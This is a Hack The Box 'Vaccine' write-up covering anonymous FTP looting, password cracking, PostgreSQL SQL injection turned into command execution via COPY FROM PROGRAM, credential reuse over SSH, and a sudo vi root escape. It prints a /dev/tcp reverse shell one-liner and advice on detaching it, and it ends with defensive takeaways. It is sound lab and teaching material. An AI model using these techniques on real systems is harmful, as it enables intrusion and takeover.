---
title: "Vaccine — HTB Writeup"
date: 2026-06-12
draft: false
---

**Difficulty:** Easy | **OS:** Linux | **Date:** June 2026

## Overview

Vaccine is one of HTB's Starting Point machines, and it's built around a theme that shows up constantly in real engagements: nothing here is a "hard" vulnerability on its own, but a chain of small misconfigurations and weak credentials adds up to full compromise. An anonymously-readable FTP share leaks a password-protected backup, that backup leaks application source code with hardcoded (and weakly hashed) credentials, those credentials unlock a web app with a SQL injection vulnerability, and the same source code later hands over a database password that doubles as the system password for privilege escalation. None of these issues would be catastrophic in isolation — together, they're a full root shell.

## Kill Chain Summary

1. Anonymous FTP access exposes a password-protected `backup.zip`
2. Crack the zip password with John the Ripper against rockyou
3. Extracted PHP source contains a hardcoded MD5 password hash for an `admin` account
4. Crack the MD5 hash, log into the web application
5. The authenticated `dashboard.php` page has a SQL-injectable `search` parameter (PostgreSQL backend)
6. SQLMap confirms command execution as the `postgres` OS user via `COPY ... FROM PROGRAM`
7. The same source tree reveals a cleartext PostgreSQL connection string — whose password is reused for the `postgres` OS account over SSH
8. `sudo -l` shows `postgres` can run `vi` on a config file as root — a classic GTFOBins editor escape gives a root shell

## Recon & Enumeration

A standard `nmap -sC -sV` against the box showed only three open ports: FTP (vsftpd 3.0.3), SSH (OpenSSH 8.0), and HTTP (Apache 2.4.41, titled "MegaCorp Login"). The FTP banner advertised anonymous login, which is always worth checking first — and sure enough, the anonymous account could list and retrieve a file called `backup.zip` sitting in the FTP root.

This is a good example of why enumeration order matters: FTP looked like the "boring" service, but it was the actual entry point. The web login page, by contrast, looked like the obvious target but was a dead end without credentials harvested elsewhere.

## Foothold

The downloaded `backup.zip` was password-protected, so I converted it to a crackable hash with `zip2john` and ran it through John the Ripper against rockyou. It cracked in under a second (`741852963`) — a purely numeric password, which is exactly the kind of thing rockyou is good at.

Inside the archive was the site's `index.php`, which contained this gem:

```php
if($_POST['username'] === 'admin' && md5($_POST['password']) === "2cb42f8734ea607eefed3b70af13bbd3") {
```

Hardcoding credentials directly in source — and using unsalted MD5 for the comparison — is a textbook CWE-798 (Use of Hard-coded Credentials) combined with CWE-916 (Use of a weak hash). Hashcat made short work of the MD5 against rockyou, recovering `qwerty789`. That gave me `admin:qwerty789` for the login page.

Once authenticated, `dashboard.php` exposed a `search` GET parameter that was reflected into a SQL query against a PostgreSQL backend. SQLMap confirmed boolean-based, error-based, stacked-query, and time-based blind injection all worked, and that the application's database user was a PostgreSQL superuser (DBA) — which is what makes `COPY ... FROM PROGRAM` based command execution possible. This PostgreSQL feature lets a superuser run an arbitrary OS command and read its output as if it were a data file, effectively turning SQL injection into RCE when the connecting role has superuser rights.

I confirmed command execution worked (`id` returned `uid=111(postgres)`), but getting a *reverse shell* through this channel turned out to be the trickiest part of the box — more on that below. In the end, the path of least resistance was simpler: the same application source that leaked the web login also contained the PostgreSQL connection string used by `dashboard.php`, including a cleartext password. That password turned out to be valid for the `postgres` Linux account over SSH directly, which became the actual foothold. `user.txt` was sitting in `/var/lib/postgresql/`.

## A Note on the SQLi → RCE Path

It's worth dwelling on why the `COPY ... FROM PROGRAM` reverse shell didn't "just work," because the failure mode is instructive. `COPY FROM PROGRAM` runs your command via `/bin/sh` and reads its **standard output** as the row data for the copy operation — Postgres waits for that command to exit and produce/close its output before the statement completes. A typical reverse shell (`bash -i >& /dev/tcp/IP/PORT 0>&1`) redirects its own stdout away to a socket and then runs *forever* (it's an interactive shell waiting on the network). From Postgres's point of view, the command never produces output and never exits — so the statement hangs until the surrounding HTTP request times out, and the resulting half-finished transaction can leave the backend in a bad state for that session.

The fix for this class of problem is to fully detach the payload from the parent's stdio *and* process group (e.g., `setsid ... </dev/null >/dev/null 2>&1 &`), being careful that the redirection syntax is POSIX-compatible since `COPY FROM PROGRAM` invokes `/bin/sh` (often `dash`), not `bash` — constructs like `&>` are bash-only and silently change the meaning of the command under `dash`. In this case, since a valid SSH credential was reachable from the same source-code leak, I used that instead of continuing to fight the injection channel — but the underlying SQLi-to-RCE primitive was real and fully demonstrated.

## Privilege Escalation

As `postgres`, `sudo -l` (after supplying the now-known password) showed a single allowed command:

```
(ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf
```

This is the GTFOBins `vi` pattern: `sudo` lets the user run `vi` as root against a specific file, but `vi` itself doesn't drop privileges for its internal `:shell` / `:!` escape commands. Critically, the sudoers rule matched only the *exact bare command* — appending extra `-c` flags to pre-supply the escape was rejected by sudo. The straightforward fix was to invoke `vi` normally (so sudo's command match succeeded), and then interactively run `:set shell=/bin/sh` followed by `:shell` once inside the editor, landing a root shell. `root.txt` was in `/root/`.

## Key Takeaways

- **Anonymous FTP is still common and still dangerous.** Any anonymously-writable or readable share should be enumerated first — it's often where "out of band" artifacts like backups end up.
- **Hardcoded credentials in source code are a recurring root cause** (CWE-798). A backup or leaked repo doesn't just expose code — it exposes whatever secrets a developer left in it, including weak hashes that crack in seconds.
- **Database superuser roles + SQL injection = RCE**, via Postgres's `COPY ... FROM PROGRAM`. This maps to MITRE ATT&CK T1190 (Exploit Public-Facing Application) and is a strong argument for running web app DB connections with the least-privilege role, not a superuser.
- **Credential reuse across application and OS boundaries** turned a database password into an SSH login — a small thing that collapsed several stages of the intended chain.
- **Sudo rules that allow editors/pagers without restricting their internal escape commands are effectively `sudo ALL`.** If a sudo policy must allow `vi`, `less`, `man`, etc., pair it with `restricted shell` controls or a wrapper, not a bare binary path.

## Tools & Techniques

| Tool | Purpose | Notable flags used |
|---|---|---|
| `nmap` | Initial service enumeration | `-sC -sV -Pn` |
| `curl` (FTP) | Anonymous FTP download | `ftp://anonymous:anonymous@...` |
| `zip2john` / `john` | Crack zip archive password | `--wordlist=rockyou.txt` |
| `hashcat` | Crack MD5 credential hash | `-m 0` |
| `curl` | Authenticate to web app, manage session cookies | `-c`/`-b` cookie jar |
| `sqlmap` | Confirm SQLi, command execution via `COPY FROM PROGRAM` | `--os-shell`, `--batch` |
| `ssh` / `sshpass` | Foothold using leaked DB credential | — |
| `vi` (via `sudo`) | GTFOBins privilege escalation | `:set shell=/bin/sh`, `:shell` |
